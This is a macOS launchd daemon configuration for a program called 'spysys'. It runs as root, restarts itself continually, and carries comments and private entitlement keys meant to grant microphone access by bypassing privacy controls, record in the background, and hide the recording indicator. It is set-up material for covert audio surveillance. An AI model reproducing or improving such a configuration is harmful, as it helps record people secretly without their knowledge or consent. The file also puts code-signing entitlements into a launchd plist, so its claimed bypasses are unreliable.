<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>hq.bao.spysys</string>

    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/spysys</string>
    </array>

    <!-- CRITICAL: Directly grants microphone access permission (TCC bypass) -->
    <key>com.apple.private.tcc.allow</key>
    <array>
        <string>kTCCServiceMicrophone</string>
    </array>

    <!-- CRITICAL: Instead of StartInterval, we use KeepAlive to restart if it crashes. -->
    <!-- The program is now responsible for its own timing (using sleep(60)). -->
    <key>KeepAlive</key>
    <true/>

    <key>StandardOutPath</key>
    <string>/var/log/spysys.log</string>

    <key>StandardErrorPath</key>
    <string>/var/log/spysys.log</string>
    
    <key>UserName</key>
    <string>root</string>

    <key>com.apple.private.security.container-required</key>
    <false/>

    <!-- CRITICAL: Allows the app to run as a system service -->
    <key>platform-application</key>
    <true/> 

    <!-- OPTIONAL: Other common private entitlements -->
    <key>com.apple.private.mediaexperience.suppressrecordingstatetosystemstatus</key>
    <true/>

    <key>com.apple.private.mediaexperience.startrecordinginthebackground.allow</key>
    <true/>

    <key>com.apple.private.avfoundation.capture.nonstandard-client.allow</key>
    <true/>
</dict>
</plist>